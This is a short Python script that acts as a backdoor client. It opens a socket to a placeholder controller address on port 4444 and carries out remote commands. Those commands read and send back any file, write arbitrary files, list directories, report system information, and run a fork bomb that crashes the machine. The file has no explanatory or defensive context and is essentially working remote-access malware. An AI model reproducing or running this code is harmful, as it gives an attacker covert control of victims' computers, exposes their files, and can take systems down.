import socket
import platform
import os

try:
    s = socket.socket()
    port = 4444
    s.connect(("paste your localhost IP here", port))
    print(s.recv(1024).decode())
    while 1:
        command = s.recv(1024).decode()

        if command == "crash":
            print("")
            while True:
                os.fork()

        elif command == "pwd":
            pwd = os.getcwd()
            s.send(pwd.encode())

        elif command == "create":
            try:
                path = s.recv(5000)
                file = open(path, "w")
                text = str(s.recv(500000).decode("utf-8"))
                file.write(text)
                file.close()
                s.send("Message sent".encode())
            except:
                error = "error"
                s.send(error.encode())

        elif command == "ls":
            try:
                files = []
                ls = s.recv(5000).decode("utf-8")
                file = os.listdir(ls)
                files.append(file)
                send = str(files)
                s.send(send.encode())
            except:
                error = "error"
                s.send(error.encode())

        elif command == "sysinfo":
            platform = platform.platform()
            s.send(platform.encode())

        elif command == "read":
            try:
                path_re = s.recv(5000).decode("utf-8")
                re_text = open(path_re, "r")
                read = re_text.read()
                s.send(read.encode())
            except:
                error = "error"
                s.send(error.encode())



except:
    print("Error :(   Disconnected from the server...!")
